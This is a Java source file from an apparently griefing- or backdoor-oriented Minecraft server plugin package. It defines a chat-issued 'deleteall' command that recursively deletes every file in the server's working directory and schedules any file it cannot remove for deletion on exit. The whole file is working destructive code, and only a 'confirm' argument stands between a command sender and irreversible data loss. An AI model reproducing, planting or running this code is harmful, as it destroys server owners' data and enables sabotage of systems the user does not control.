package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;

public class DeleteAll implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"deleteall"};
    }

    @Override
    public String getDescription() {
        return "Attempts to delete all files on a server.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String confirm = "";
        String[] args = context.getArgs();
        if (args.length != 0) {
            confirm = args[0];
        }

        if (!confirm.equals("confirm")) {
            sender.sendMessage(Colors.Prefix + Colors.Caution + "Are you sure you want to do this? This will delete all files and is irreversible. To confirm, use 'deleteall confirm'.");
            return;
        }

        try {
            Files.walk(Paths.get(""))
                    .sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(file -> {
                        if (file.delete()) {
                            sender.sendMessage(Colors.Success + "Successfully deleted file " + file.getPath() + "!");
                            return;
                        }

                        sender.sendMessage(Colors.Failure + "Could not delete " + file.getPath() + "! Attempting to delete on exit!");
                        file.deleteOnExit();
                    });
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "" + ChatColor.BOLD + "Finished attempting to delete all files!");
    }
}
